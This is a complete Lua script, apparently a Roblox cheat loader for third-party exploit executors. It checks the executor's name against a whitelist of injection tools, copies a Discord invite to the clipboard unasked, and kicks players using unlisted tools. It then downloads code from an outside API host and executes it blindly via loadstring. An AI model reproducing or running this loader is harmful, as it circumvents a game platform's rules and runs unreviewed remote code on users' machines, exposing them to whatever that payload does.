local p = game:GetService("Players")
local lp = p.LocalPlayer
local env = getfenv()
local ie = env.identifyexecutor or env.getexecutorname
local name = "unknown"

if ie then
    local s, r = pcall(ie)
    if s and r then
        name = tostring(r):lower()
    end
end

local wl = {
    "volt", "potassium", "pottasium", "wave", "seliware", 
    "synapse", "sirhurt", "madium", "velocity", 
    "macsploit", "opiumware", "yub-x", "delta", "codex", "real"
}

local ok = false
for _, v in ipairs(wl) do
    if name:find(v) then
        ok = true
        break
    end
end

if not ok then
    pcall(function() setclipboard("https://discord.gg/UPRtgK6tEJ") end)
    lp:Kick("Not Support Executor " .. name .. "Join to discord to get supported executor (he auto copy ti clipboard)")
end

loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/0a830bbd49d971ead679990c033421624aafe6d222598324675a46ab7338aa2d/download"))()
